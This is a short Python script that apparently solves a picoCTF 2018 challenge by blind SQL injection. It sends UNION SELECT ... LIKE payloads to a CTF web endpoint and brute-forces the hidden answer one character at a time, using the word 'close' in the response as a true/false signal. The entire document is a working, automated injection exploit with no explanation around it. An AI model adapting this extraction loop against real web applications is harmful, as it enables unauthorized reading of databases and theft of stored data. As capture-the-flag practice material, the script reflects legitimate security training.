import requests
import string

URL = 'http://2018shell3.picoctf.com:36052/answer2.php'

diction = string.printable.replace('"', '').replace('%', '')
answer = "' UNION SELECT * FROM answers WHERE answer LIKE "

portion = ''

flag = True
while flag == True:
	flag = False
	for i in diction:
		tmp = answer + "'" + portion + str(i) + "%'--"
		r = requests.post(URL, data={'answer':tmp, 'debug':0})
		
		print "try", tmp
		if "close" in r.text:
			flag = True
			portion += str(i)
			break

print portion
